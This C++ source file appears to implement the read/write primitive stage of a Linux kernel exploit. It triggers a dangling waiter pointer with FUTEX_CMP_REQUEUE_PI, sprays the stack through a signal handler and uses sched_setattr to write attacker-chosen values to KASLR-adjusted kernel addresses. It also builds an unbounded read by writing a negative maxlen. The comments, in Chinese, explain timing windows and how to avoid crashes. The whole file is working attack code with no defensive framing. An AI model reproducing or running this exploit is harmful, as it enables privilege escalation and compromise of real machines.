#include "prim.h"
#include <cstring>
#include <fcntl.h>
#include <unistd.h>
#include <ctime>
#include <thread>
#include <csignal>
#include <linux/futex.h>
#include "../const.h"
#include "../tools.h"
using std::cout, std::dec, std::hex, std::endl;
void Prim::read_link(unsigned long addr, std::vector<unsigned long> &data, unsigned long n, int layout) {
    std::lock_guard ul(rw_mtx);
    Print print("read_p");
    //上次读的位置不用再写
    if (addr == addr_last_read && layout == layout_last_read) {
        data = get_api(n);
        return;
    }
    //新位置消耗一个槽
    write_link_no_lock(LINK_TCPMEM_DATA, addr, layout);
    data = get_api(n);
    addr_last_read = addr;
    layout_last_read = layout;
}

void Prim::write_link(unsigned long addr, unsigned long val, int layout) {
    std::lock_guard lg(rw_mtx);
    write_link_no_lock(addr, val, layout);
}

void Prim::write_link_no_lock(unsigned long addr, unsigned long val, int layout) {
    Print print("write_p");
    VICTIM = addr + kaslr_slide;
    PAYLOAD = val + kaslr_slide;
    if (layout == 2) PAYLOAD = 0;
    LOCK = LINK_LOCK_START + SLOT*LINK_SLOT_SIZE + kaslr_slide;
    update_waiter_layout();//修改了字段，需要先更新布局
    cout << hex;
    print("===== 写原语开始，SLOT=",std::to_string(SLOT)," VICTIM=",VICTIM," PAYLOAD=",PAYLOAD," LAYOUT=",layout);
    cout << dec;
    check_addr(layout);
    WAITER = waiter_layout[layout];//再更新WAITER
    //通知涂栈
    {
        std::lock_guard lg1(cv_mtx);
        place_stack = true;
    }
    cv.notify_one();
    while (!w_done) {
        asm volatile("yield");
    }
    //此后到消费完别做其他事
    consumer(); //消费
    ++SLOT;
    print("##### 写原语结束");
}

Prim::Prim() {
    Print print("Prim构造");
    //如果不是lock_free，会退化成锁，触发系统调用，影响利用链。可换成std::atomic_flag
    static_assert(std::atomic<bool>::is_always_lock_free);
    w = std::thread(&Prim::waiter, this);
    o = std::thread(&Prim::owner, this);
    while (!w_owns_chain || !o_owns_target) //等两线程拿到自己的锁
        asm volatile("yield");
    mysleep(100);//等形成死锁（未触发）
    //触发waiter悬垂指针
    errno = 0;
    long r = cmp_requeue_pi(&f_wait, &f_target, 0); //触发死锁并回滚
    if (r < 0 && errno != EDEADLK) {
        print("没拿到 -EDEADLK：CMP_REQUEUE_PI 返回", r, " 错误信息：", strerror(errno));
        exit(1);
    }
    print("-EDEADLK 触发成功");
    //读这个环境变量一定要在读w_door前，不然窗口会变长，DELTA无效
    if (auto p = getenv("DELTA")) {
        delay_us = std::stoi(p);//单位是微秒
        print("用户给定DELTA=",delay_us);
    }
    else if (!getenv("PAD")) {
        print("没给DELTA，默认5000微秒");
        delay_us = 5000;
    }
    else {
        print("没给DELTA，默认20微秒");
        delay_us = 20;
    }
    //构造可变长有界读条件：把maxlen写成负数
    write_link(LINK_TCPMEM_DATA + 4, LINK_LOCK_START + (LINK_SLOT_MAX+1)*LINK_SLOT_SIZE, 0);
    print("可变长有界读原语构建完成");
}

Prim::~Prim() {
    Print print("Prim析构");
    {
        std::lock_guard lg(cv_mtx);
        cleanup = true;
    }
    cv.notify_all();
    if (w.joinable()) w.join();
    if (o.joinable()) o.join();
    cout << dec;
    print("同次开机下次运行请设置SLOT=",SLOT);
}

void Prim::waiter() {
    Print print("W");
    w_tid = my_tid();
    lock_pi(&f_chain);
    w_owns_chain = true;
    wait_requeue_pi(&f_wait, &f_target);
    while (true) {
        std::unique_lock ul(cv_mtx);
        cv.wait(ul, [&]{return cleanup || place_stack;});
        if (cleanup) break;
        place_stack = false;
        ul.unlock();
        setup_altstack();
        syscall(SYS_tgkill, getpid(), my_tid(), SIGUSR1); //涂完后自动设w_done
        // 消费期间严禁发syscall
    }
    //收尾，防止内核读到悬垂waiter崩溃
    unlock_pi(&f_chain);
    print("放锁收尾成功");
}

void Prim::owner() {
    Print print("O");
    lock_pi(&f_target);
    o_owns_target = true;
    while (!w_owns_chain)
        asm volatile("yield");
    lock_pi(&f_chain);
    {
        std::unique_lock ul(cv_mtx);
        cv.wait(ul, [&]{return cleanup;});
        ul.unlock();
    }
    //收尾，防止内核读到悬垂waiter崩溃
    unlock_pi(&f_chain);
    unlock_pi(&f_target);
    print("放锁收尾成功");
}

void Prim::consumer() {
    //此后到消费完别做其他事
    if (delay_us > 0) {
        auto until = rdcnt() + delay_us * (frq / 1000'000UL);
        while (rdcnt() < until) {
            asm volatile("yield");
        }
    }
    long sr = sched_setattr_batch(w_tid);//消费
    w_done = false; // 每次消费重新涂栈
    Print print("consumer");
    if (sr < 0) {
        print("消费失败",strerror(errno));
        exit(1);
    }
}
